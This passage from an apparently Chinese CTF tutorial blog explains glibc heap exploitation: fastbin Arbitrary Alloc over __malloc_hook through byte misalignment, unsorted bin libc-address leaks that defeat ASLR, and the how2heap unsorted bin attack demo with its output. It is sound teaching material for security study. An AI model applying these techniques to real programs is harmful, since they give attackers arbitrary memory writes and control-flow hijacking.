/lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-<br>0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-<br>0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-<br>0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]<br>0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]<br>0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-<br>0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]<br>0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]<br></code></pre></div></td></tr></table></figure><h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 <strong>bss、heap、data、stack</strong> 等等。</p><h3 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h3><p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。** </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=<span class="hljs-number">0x7ffff7dd1af5</span><span class="hljs-number">-0x8</span>;<span class="hljs-comment">//1ad5是malloc_hook的位置, 由于fd指针指向的是chunk的开头, </span><br>    <span class="hljs-comment">//所以要覆盖malloc_hook要往前8字节使其成为user date</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//malloc出temp</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//往这个指针里面写内容就可以改写malloc_hook</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里的 <strong>0x7ffff7dd1af5</strong> 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以<strong>字节错位</strong>的情况。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0<br></code></pre></div></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//这里的size指用户区域，因此会小于2倍SIZE_SZ</span><br>Fastbins[idx=<span class="hljs-number">0</span>, size=<span class="hljs-number">0x10</span>]<br>Fastbins[idx=<span class="hljs-number">1</span>, size=<span class="hljs-number">0x20</span>]<br>Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>]<br>Fastbins[idx=<span class="hljs-number">3</span>, size=<span class="hljs-number">0x40</span>]<br>Fastbins[idx=<span class="hljs-number">4</span>, size=<span class="hljs-number">0x50</span>]<br>Fastbins[idx=<span class="hljs-number">5</span>, size=<span class="hljs-number">0x60</span>]<br>Fastbins[idx=<span class="hljs-number">6</span>, size=<span class="hljs-number">0x70</span>]<br></code></pre></div></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br><br>0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f<br></code></pre></div></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz)                                                      \</span><br><span class="hljs-meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></div></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）</p><p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;<br> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax<br><span class="hljs-meta"></span><br><span class="hljs-meta"> $</span><span class="bash">rax   : 0x7ffff7dd1afd</span><br><br>0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f<br>0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f<br>0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000<br>0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000<br></code></pre></div></td></tr></table></figure><h3 id="小总结-2"><a href="#小总结-2" class="headerlink" title="小总结"></a>小总结</h3><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p><h2 id="具体题目遇到再说"><a href="#具体题目遇到再说" class="headerlink" title="具体题目遇到再说"></a>具体题目遇到再说</h2><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p><p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><p><strong>基本来源</strong> </p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><h3 id="Leak-原理"><a href="#Leak-原理" class="headerlink" title="Leak 原理"></a>Leak 原理</h3><p>如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，实现对 <code>ASLR</code> 的绕过。</p><p>那么如何取得 <code>main_arena</code> 与 <code>libc</code> 基址的偏移呢？这里提供两种思路。</p><ol><li><strong>__malloc_trim 函数得出</strong> </li></ol><p>在 <code>malloc.c</code> 中有这样一段代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>__malloc_trim (<span class="hljs-keyword">size_t</span> s)<br>&#123;<br>  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>    ptmalloc_init ();<br><br>  mstate ar_ptr = &amp;main_arena;<span class="hljs-comment">//&lt;=here!</span><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      __libc_lock_lock (ar_ptr-&gt;mutex);<br>      result |= mtrim (ar_ptr, s);<br>      __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>      ar_ptr = ar_ptr-&gt;next;<br>    &#125;<br>  <span class="hljs-keyword">while</span> (ar_ptr != &amp;main_arena);<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>注意到 <code>mstate ar_ptr = &amp;main_arena;</code> 这里对 <code>main_arena</code> 进行了访问，所以我们就可以通过 IDA 等工具分析出偏移了。</p><p>比如把 <code>.so</code> 文件放到 IDA 中，找到 <code>malloc_trim</code> 函数，就可以获得偏移了。</p><ol start="2"><li><strong>__malloc_hook 直接算出</strong> </li></ol><p>比较巧合的是，<code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></div></td></tr></table></figure><p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p><h3 id="实现-Leak-的方法"><a href="#实现-Leak-的方法" class="headerlink" title="实现 Leak 的方法"></a>实现 Leak 的方法</h3><p>一般来说，要实现 leak，需要有 <code>UAF</code>，将一个 <code>chunk</code> 放入 <code>Unsorted Bin</code> 中后再打出其 <code>fd</code>。一般的笔记管理题都会有 <code>show</code> 的功能，对处于链表尾的节点 <code>show</code> 就可以获得 <code>libc</code> 的基地址了。</p><p>特别的，<code>CTF</code> 中的利用，堆往往是刚刚初始化的，所以 <code>Unsorted Bin</code> 一般都是干净的，当里面只存在一个 <code>bin</code> 的时候，该 <code>bin</code> 的 <code>fd</code> 和 <code>bk</code> 都会指向 <code>main_arena</code> 中。</p><p>另外，如果我们无法做到访问链表尾，但是可以访问链表头，那么在 32 位的环境下，对链表头进行 <code>printf</code> 等往往可以把 <code>fd</code> 和 <code>bk</code> 一起输出出来，这个时候同样可以实现有效的 leak。然而在 64 位下，由于高地址往往为 <code>\x00</code>，很多输出函数会被截断，这个时候可能就难以实现有效 leak。</p><h2 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h2><p>在 <a href="https://code.woboq.org/userspace/glibc/">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/">malloc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">malloc.c</a> 中的 <code>_int_malloc</code> 有这么一段代码，当将一个 unsorted  bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></div></td></tr></table></figure><p>换而言之，如果我们控制了 <code>bk</code> 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p><blockquote><p>注意!!!这种检查从2.28版本开始, 本篇部分2.27已修改为2.28版本, 更新的有待更新</p></blockquote><p>这里我以 shellphish 的 how2heap 仓库中的 <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted_bin_attack.c</a> 为例进行介绍，这里我做一些简单的修改，如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span><br>                  <span class="hljs-string">&quot;unsigned long value into stack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<br>      <span class="hljs-built_in">stderr</span>,<br>      <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span><br>      <span class="hljs-string">&quot;attacks, such as rewriting the &quot;</span><br>      <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> target_var = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>          <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,<br>          p);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid &quot;</span><br>                  <span class="hljs-string">&quot;consolidating the top chunk with&quot;</span><br>                  <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>  <span class="hljs-built_in">free</span>(p);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the &quot;</span><br>                  <span class="hljs-string">&quot;unsorted bin with its bk pointer &quot;</span><br>                  <span class="hljs-string">&quot;point to %p\n&quot;</span>,<br>          (<span class="hljs-keyword">void</span> *)p[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">/*------------VULNERABILITY-----------*/</span><br>  p[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span><br>                  <span class="hljs-string">&quot;victim-&gt;bk pointer\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span><br>                  <span class="hljs-string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,<br>          (<span class="hljs-keyword">void</span> *)p[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------------------------------</span><br><br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span><br>                  <span class="hljs-string">&quot;this time, target should has already been &quot;</span><br>                  <span class="hljs-string">&quot;rewrite:\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-keyword">void</span> *)target_var);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>程序执行后的效果为</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">➜  unsorted<span class="hljs-emphasis">_bin_</span>attack git:(master) ✗ gcc unsorted<span class="hljs-emphasis">_bin_</span>attack.c -o unsorted<span class="hljs-emphasis">_bin_</span>attack<br>➜  unsorted<span class="hljs-emphasis">_bin_</span>attack git:(master) ✗ ./unsorted<span class="hljs-emphasis">_bin_</span>attack<br>This file demonstrates unsorted bin attack by write a large unsigned long value into stack<br>In practice, unsorted bin attack is generally prepared for further attacks, such as <span class="hljs-emphasis">*rewriting the global variable global_max_fast*</span> in libc for further fastbin attack<br><br>Let&#x27;s first look at the target we want to rewrite on stack:<br>0x7ffe0d232518: 0<br><br>Now, we allocate first normal chunk on the heap at: 0x1fce010<br>And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()<br><br>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78<br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br>And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508<br><br>Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:<br>0x7ffe0d232518: 0x7f1c705ffb78<br></code></pre></div></td></tr></table></figure><p>这里我们可以使用一个图来描述一下具体发生的流程以及背后的原理。</p><p><img src="../../image/glibc_malloc_srcCode/unsorted_bin_attack_order.png" alt="img"></p><p><strong>初始状态时</strong> </p><p>unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。</p><p><strong>执行 free(p)</strong> </p><p>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p><p><strong>修改 p[1]</strong> </p><p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><strong>申请 400 大小的 chunk</strong> </p><p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;<br>    bck = victim-&gt;bk;<br>    <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                        chunk2mem(victim), av);<br>    size = chunksize(victim);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">       only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">       runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">       exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">       no exact fit for a small chunk.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* 显然，bck被修改，并不符合这里的要求*/</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) &#123;<br>        ....<br>    &#125;<br><br>    <span class="hljs-comment">/* remove from unsorted list */</span><br>    unsorted_chunks(av)-&gt;bk = bck;<br>    bck-&gt;fd                 = unsorted_chunks(av);<br></code></pre></div></td></tr></table></figure><ul><li>victim = unsorted_chunks(av)-&gt;bk=p</li><li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li><li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li><li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li></ul><p><strong>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><p><strong>即修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。</strong> </p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">We</span> free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to <span class="hljs-number">0</span>x<span class="hljs-number">7</span>f<span class="hljs-number">1</span>c<span class="hljs-number">705</span>ffb<span 